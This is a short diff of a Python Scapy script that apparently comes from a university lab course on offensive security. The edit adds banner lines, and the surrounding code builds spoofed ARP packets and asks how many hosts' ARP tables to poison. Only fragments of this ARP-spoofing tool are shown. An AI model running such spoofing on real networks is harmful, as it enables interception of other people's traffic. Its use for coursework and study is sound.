@@ -1,5 +1,8 @@
 from scapy.all import * 
 
+print ( '\033[95m' +"        2IC80 Lab on offensive computer security        ")
+print ( '\033[95m' +"                Group 44 2021/2022 TU/e                 ")
+print ( '\033[0m'  +"--------------------------------------------------------")
 
 def spoofedPkt(macVictim, ipVictim, ipToSpoof):
     arp= Ether() / ARP()
@@ -32,7 +35,8 @@ dictIPMAC = {}
 for i in range(len(hosts[0])): #hosts[0] contains the answers form the hosts that are up
     dictIPMAC[hosts[0][i][1][ARP].psrc] = hosts[0][i][1][ARP].hwsrc
     print("Host ", hosts[0][i][1][ARP].psrc, "is up")
-
+    
+print ( '\033[0m'  +"--------------------------------------------------------")
 print("How many hosts arp tables do you want to spoof: ")
 inputNumber = int(input())
 
